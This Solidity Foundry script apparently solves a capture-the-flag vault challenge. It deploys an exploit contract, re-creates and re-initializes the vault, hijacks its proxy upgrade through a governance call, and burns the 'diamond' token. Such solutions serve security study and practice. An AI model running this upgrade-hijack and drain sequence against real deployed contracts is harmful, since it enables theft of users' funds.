// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Exploit.sol";
import "src/Challenge.sol";

contract RecreateVault is Script {
    Exploit exploit;
    address private playerWallet;
    address private challengeContractAddress;
    address private vaultFactoryAddress;
    address private vaultAddress;
    address private diamondCoinAddress;
    address private hexensCoinAddress;

    function run() public {
        // Initialize variables (replace with actual addresses)
        challengeContractAddress = vm.envAddress("CHALLENGE_CONTRACT_ADDRESS");
        vaultFactoryAddress = IChallenge(challengeContractAddress).vaultFactory();
        vaultAddress = IChallenge(challengeContractAddress).vault();
        diamondCoinAddress = IChallenge(challengeContractAddress).diamond();
        hexensCoinAddress = IChallenge(challengeContractAddress).hexensCoin();
        playerWallet = msg.sender;

        // Deploy the Exploit contract if not already deployed
        vm.startBroadcast();
        exploit = new Exploit();
        vm.stopBroadcast();

        vm.startBroadcast(playerWallet);
        exploit.reCreateVault(vaultFactoryAddress);
        console.log("Successfully called reCreateVault from exploit contract");

        IVault(playerWallet).initialize(diamondCoinAddress, hexensCoinAddress);
        console.log("Successfully called initialize from player wallet");

        upgradeGovernance();
        console.log("Second upgradeTo from player wallet");

        exploit.myBurn(diamondCoinAddress);
        console.log("Successfully called myBurn from exploit contract");
        vm.stopBroadcast();
    }

    function upgradeGovernance() public {
        bytes memory data = abi.encodeWithSelector(IVault.upgradeTo.selector, address(exploit));
        IVault(vaultAddress).governanceCall(data);
    }
}
